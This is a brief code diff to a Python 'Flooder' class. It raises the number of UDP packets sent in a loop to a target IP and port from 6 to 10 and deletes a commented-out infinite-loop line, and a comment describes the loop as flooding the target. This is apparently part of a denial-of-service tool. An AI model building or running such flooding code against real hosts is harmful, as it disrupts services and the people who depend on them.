@@ -35,8 +35,7 @@ class Flooder:
         #    time.sleep(freq * 10)
 
         # This loop is for sending packet to target infinitely
-        for i in range(0, 6):
-        #while(KeyboardInterrupt):
+        for i in range(0, 10):
             packet = self.construct_packet(length)
             sock.sendto(packet, (ip, port))
             time.sleep(freq)
